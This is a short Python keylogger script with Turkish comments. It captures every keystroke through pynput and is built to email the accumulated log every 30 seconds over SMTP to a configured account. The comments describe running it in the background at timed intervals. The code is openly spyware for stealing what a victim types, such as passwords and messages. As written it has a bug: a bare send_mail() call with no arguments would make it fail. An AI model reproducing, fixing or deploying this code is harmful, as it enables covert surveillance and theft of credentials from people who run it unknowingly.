from pynput import keyboard
import smtplib
import threading

#DEĞİŞİK MAİL ADRELSERİ DENE BUNU KULLANMAK İSTİYORSAN


log = ""

#callback_function değerimizin içine aldığımız değer klavyede olan harekettir.
def callback_function(key):
    global log

    try:
        log = log +str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + str(" ")
        else:
            log = log + str(key)
    except:
        pass
    print(log)

def send_mail(email,psswd,msg):
    email_server = smtplib.SMTP("smtp.yandex.org",587)
    email_server.starttls()
    email_server.login(email,psswd)
    email_server.sendmail(email,email,msg)
    email_server.quit()

send_mail()
#ARKA PLANDA ÇALIŞMASINI SAĞLAR BELLİ ZAMAN ARALIKLARI BOYUNCA
def thread_function():
    global log
    send_mail("user@gmail.com", "password", log.encode('utf-8'))
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()



#Klavye üzerinde yapılan hareketi algılar ve callback_functionu çalıştırır
keyboard_listener = keyboard.Listener(on_press=callback_function)

with keyboard_listener:
    keyboard_listener.join()

